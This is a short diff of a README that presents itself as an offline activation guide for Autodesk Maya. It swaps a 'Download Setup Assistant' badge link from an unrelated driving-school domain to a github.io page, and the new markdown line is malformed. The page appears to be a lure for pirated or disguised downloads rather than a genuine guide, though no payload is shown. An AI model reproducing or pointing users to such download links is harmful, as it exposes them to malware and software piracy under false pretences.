@@ -1,6 +1,6 @@
 # Autodesk Maya — Offline Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://dalahdrivingschool.com/)
+[![Download Setup Assistant](https://autodesk-maya-offline-activation-guide.github.io/.github)
 
 ## ⚙️ How to Use
 
